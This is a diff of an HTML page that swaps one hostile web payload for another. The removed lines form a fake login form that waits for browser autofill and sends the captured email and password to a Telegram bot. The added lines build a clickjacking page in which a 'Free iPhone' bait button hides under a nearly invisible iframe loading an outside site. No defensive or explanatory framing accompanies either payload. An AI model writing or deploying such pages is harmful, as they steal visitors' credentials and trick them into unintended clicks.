@@ -1,31 +1,38 @@
 <!DOCTYPE html>
 <html>
 <head>
-  <title>Login</title>
+  <title>Free iPhone Giveaway!</title>
+  <style>
+    body {
+      margin: 0;
+    }
+    .bait-button {
+      position: absolute;
+      top: 120px;
+      left: 50px;
+      width: 300px;
+      height: 100px;
+      background-color: red;
+      color: white;
+      font-size: 24px;
+      text-align: center;
+      line-height: 100px;
+      z-index: 1;
+    }
+    iframe {
+      position: absolute;
+      top: 120px;
+      left: 50px;
+      width: 300px;
+      height: 100px;
+      opacity: 0.01; /* hidden */
+      z-index: 2;
+      border: none;
+    }
+  </style>
 </head>
 <body>
-  <form id="login">
-    <input type="email" id="email" name="email" autocomplete="email" placeholder="Email"><br><br>
-    <input type="password" id="pass" name="password" autocomplete="current-password" placeholder="Password"><br><br>
-    <button type="button" onclick="capture()">Login</button>
-  </form>
-
-  <script>
-    function capture() {
-      // Let browser autofill after click
-      setTimeout(() => {
-        const email = document.getElementById('email').value
-        const pass = document.getElementById('pass').value
-
-        if (email && pass) {
-          const token = "your_bot_token"
-          const chat_id = "your_chat_id"
-          const msg = `Email: ${email}\nPass: ${pass}`
-
-          fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(msg)}`)
-        }
-      }, 2000) // Wait 2 sec for autofill to apply
-    }
-  </script>
+  <div class="bait-button">Click to Win a Free iPhone 📱</div>
+  <iframe src="https://licensing-expo-collections.netlify.app"></iframe>
 </body>
 </html>
